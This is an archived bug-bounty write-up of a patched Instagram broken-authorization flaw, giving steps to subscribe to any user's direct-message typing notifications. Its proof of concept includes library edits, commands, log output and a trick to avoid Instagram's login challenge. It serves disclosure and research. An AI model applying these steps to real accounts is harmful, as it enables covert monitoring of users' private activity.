---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-07-21_subscribe-to-typing-notifications-for-any-instagram-user.md
original_filename: 2019-07-21_subscribe-to-typing-notifications-for-any-instagram-user.md
title: Subscribe to typing notifications for any Instagram user
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
- csrf
- supply-chain
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
- csrf
- supply-chain
language: en
raw_sha256: 2599832acb2e8dde2dba4678ab3d3b66bb65f471f18cf0056ce520df3370801f
text_sha256: 135dd8720fe41d8dc55dc5d318a21544330916665d60b12741598c08dc44c7af
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Subscribe to typing notifications for any Instagram user

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-07-21_subscribe-to-typing-notifications-for-any-instagram-user.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql, csrf, supply-chain
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `2599832acb2e8dde2dba4678ab3d3b66bb65f471f18cf0056ce520df3370801f`
- Text SHA256: `135dd8720fe41d8dc55dc5d318a21544330916665d60b12741598c08dc44c7af`


## Content

---
title: "Subscribe to typing notifications for any Instagram user"
page_title: "Subscribe to typing notifications for any Instagram user - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/subscribe-to-typing-notifications-for-any-instagram-user/"
final_url: "https://philippeharewood.com/subscribe-to-typing-notifications-for-any-instagram-user/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization"]
bounty: "5,750"
publication_date: "2019-07-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5131
---

Posted on [July 21, 2019](https://philippeharewood.com/subscribe-to-typing-notifications-for-any-instagram-user/)

# Subscribe to typing notifications for any Instagram user

Instagram subscribes to typing notifications for Instagram direct messages via the MQTT protocol. It is possible to subscribe to these messages as any user.

##### Prerequisites

Install the following API library  
<https://github.com/mgp25/Instagram-API>  
This was used to pull out the MQTT activity.

This an unofficial API, so any account used _most likely_ will hit the challenge page for Instagram (<https://github.com/mgp25/Instagram-API/wiki/FAQ#what-does-checkpoint_required-error-mean>). To bypass this first, use Burp Suite and <https://www.facebook.com/whitehat/researcher-settings/> to grab device IDs by listening to the following call,

`POST /api/v1/accounts/login/ HTTP/1.1  
Host: i.instagram.com`

The body should look similar to the following

`{  
"country_codes": "[{\"country_code\":\"1\",\"source\":[\"default\"]}]",  
"phone_id": "PHONE_ID",  
"big_blue_token": "EAAA",  
"_csrftoken": "1",  
"username": "facebook",  
"adid": "1",  
"guid": "1",  
"device_id": "DEVICE_ID  
"google_tokens": "[]",  
"password": "hunter123",  
"login_attempt_count": "0"  
}`

Get the `country_codes`, `phone_id`, and `device_id` and set them on LINE 47 at <https://github.com/mgp25/Instagram-API/blob/master/src/Instagram.php#L497>

It can be verified via trying the following example included in the repository

`php vendor/mgp25/instagram-php/examples/accessingValues.php`

without triggering the Instagram security challenge. (Be sure to set attacker’s credentials in the `accessingValues.php` at the top)

##### Proof of Concept

1\. Find an Instagram account to target for watching messages. This is simple as going to view-source:https://www.instagram.com/USERNAME/ and doing a Crtl-F for “profilePage_”. The ID at the end of this string will be the current ID of the IG user.

Example  
`view-source:https://www.instagram.com/instagram/  
profilePage_25025320  
IG ID 25025320`

2\. In the instagram-php library source, edit https://github.com/mgp25/Instagram-API/blob/master/src/Realtime/Subscription/GraphQl/DirectTypingSubscription.php#L20

and change `'user_id' => $accountId,`

to `'user_id' => 'IGID',`

where IGID is the target ID from step 1.

Example `'user_id' => '25025320',`

3\. Run the following example with your attacker credentials entered in the file

https://github.com/mgp25/Instagram-API/blob/master/examples/realtimeClient.php

`php realtimeClient.php`

4\. As a third IG user (6865002786) type, without sending to the direct inbox of the target set in step 2.

The subscription responses should return similar to the following

[2019-07-21 22:18:29] rtc.INFO: Processing a message for module “direct” [{“event”:”patch”,”data”:[{“op”:”add”,”path”:”/direct_v2/threads/111111111111111111111/activity_indicator_id/1,”value”:”{\”timestamp\”: \”1563747527462648\”, \”sender_id\”: \”6865002786\”, \”ttl\”: 12000, \”activity_status\”: 0}”}]}] []  
[RTC] Thread 111111111111111111111 has some activity made by 6865002786

This response shows the user _phwd_ (‘6865002786’) is currently typing to the user _instagram_ (‘25025320’) on the thread 111111111111111111111.

**Impact**

This could have let a malicious user subscribe to typing notifications for a target Instagram user. This specific vulnerability would have received a monetary award of $5000. Whilst investigating the report, Facebook internally discovered two other issues in this component. It is Facebook’s aim to reward researchers for the potential maximum impact, and in this case Facebook’s internal discoveries would be another $5000 as well as an additional $750.

Timeline

Jul 21, 2019 6:30 PM – Report sent  
Jul 22, 2019 1:04 PM – Confirmation of submission by Facebook  
Jul 24, 2019 3:32 PM – Confirmation of patch by Facebook  
Jul 30, 2019 – $10750 Bounty awarded by Facebook
